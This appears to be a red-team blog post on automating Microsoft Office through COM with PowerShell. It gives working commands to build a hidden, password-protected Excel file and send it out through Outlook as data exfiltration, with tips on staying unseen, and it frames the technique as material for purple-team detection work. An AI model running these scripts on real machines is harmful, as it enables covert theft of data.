---
title: "Automating Microsoft Office to Achieve Red Teaming Objectives"
date: 2021-07-05T13:00:54-07:00
draft: true
tags: [
        "red", "ttp"
    ]
---

Many Windows applications and services are implemented using an automation infrastructure called `Component Object Model (COM)`. 

`COM` has been around for decades and its useful for programming, sharing of code at binary level, usage from scripting languages, and well, red teaming. 

## Wide Usage of Component Object Model

Many products are implemented as COM objects, including Microsoft Office. Using `PowerShell` (or other languages) `COM` objects can be created to fully automate applications and services. 

There is even a [Golang project to show how to invoke COM](https://github.com/go-ole/go-ole) from Go, which I'm certain real-world malware will pick up on soon.

## Exploring the Attack Angle

If a victim of a cyber attack has the Microsoft Office Suite installed malware can use `COM` in malicous and subversive ways. 

Importantly, this might be something that your Blue Teams is not yet trained to look for, so doing an operation in this space will be useful to build detection and investigation muscles.

Let's explore some scenarios and code examples in this blog post.

## Automating Microsoft Excel

For instance, it's quite simple to automate the popular `Excel` application via `PowerShell`. We can use the `New-Object -com` command to create the Excel Application, and subsequently interact with the returned object.

```
PS C:\> $excel = New-Object -com Excel.Application
PS C:\> $excel.Visible = $true
```

To stay under the radar and hide the user interface, use the default of `Visible = $false`.

### Editing the Excel document

As the next step we can add a `Workbook` and write some data to a specific `Cell`.

```
PS C:\> $workbook = $excel.Workbooks().Add()
PS C:\> $cell = $workbook.ActiveSheet.Cells(1,1)
PS C:\> $cell.Value = "Here goes the secret message!"
PS C:\> $workbook.Password = "Test"
```

This is how the result looks like:

![Using Excel Automation](/blog/images/2021/excel.PNG)

The above images shows the created Excel document. *Remember that we set `Visible=$true` - this to demo what is possible, during an attack an adversary would not show the user interface.*

### Saving the document

Using the `SaveAs` function the document can be stored.

```
PS C:\> $workbook.SaveAs("EmbraceTheRed")
```

### Closing the document

Finally, Excel can be closed.

```
PS C:\> $workbook.Close()
PS C:\> $excel.Quit()
```

### Data Exfiltration - Emailing the document

As said all most of Office is implemented using COM interfaces, so we can automate `Outlook` as well. 

In order to send the created `Excel` document out of the network, an adversary could use `Outlook` for instance. 

```
$to = ""
$subject = "Secret Excel Document"
$content = "Important message attached."

$outlook = New-Object -com Outlook.Application
$mail = $outlook.CreateItem(0)
$mail.Attachments.Add("EmbraceTheRed")
$mail.subject = $subject
$mail.To = $to
$mail.HTMLBody = $content

$mail.Send()
```

Note, this will use the current users Outlook profile.

Alternatively you could just use the Excel built in `SendMail` API which is [documented here](https://docs.microsoft.com/en-us/office/vba/api/excel.workbook.sendmail).


## Command & Control via Office Automation

Using these COM automation techniques its possible to use off the shelve applications installed on a compromised machine to exfiltrate data, but also to establish an entire C2 infrastructure and message communication. 

The MITRE ATT&CK matrix also [highlights a couple of real world attacks](https://attack.mitre.org/techniques/T1559/001/) that have used COM.

## Conclusion

COM Automation and scripting langauges are a powerful way for malware to perform operations, including data exfiltration. It uses existing applications already present on a compromised host which can make malicious usage difficult to detect. Hence it's important to monitor for untypically COM usage.

**In my opinion these TTPs are a good candidates for a purple team operations.**


Cheers,
[@wunderwuzzi23](https://twitter.com/wunderwuzzi23)

If you found this interesting check out my book about [Cybersecurity Attacks - Red Team Strategies](https://www.amazon.com/gp/product/1838828869/ref=as_li_tl?ie=UTF8&tag=wunderwuzzi-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=1838828869&linkId=07bfd6b729fbc2b2904160e0e16c337f).


## References

1. [Golang projects that show how to use COM from Go](https://github.com/go-ole/go-ole). 
1. [SendMail Excel API](https://docs.microsoft.com/en-us/office/vba/api/excel.workbook.sendmail)
1. [COM and MITRE Attack](https://attack.mitre.org/techniques/T1559/001/)